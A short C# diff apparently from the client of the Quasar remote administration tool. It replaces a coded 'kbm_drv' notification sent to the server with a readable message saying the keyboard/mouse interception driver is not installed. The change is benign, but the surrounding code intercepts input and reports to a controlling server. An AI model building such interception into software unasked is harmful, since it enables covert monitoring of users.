@@ -617,7 +617,8 @@ namespace Quasar.Client.Interception
             }
             else
             {
-                client.Send(new NotifyMessageToServer { Type = "kbm_drv", Message = "KBMDRVNOTI" });
+                //client.Send(new NotifyMessageToServer { Type = "kbm_drv", Message = "KBMDRVNOTI" });
+                client.Send(new NotifyMessageToServer { Type = "kbm_drv", Message = "KB/M driver is not installed!" });
                 return false;
             }
         }
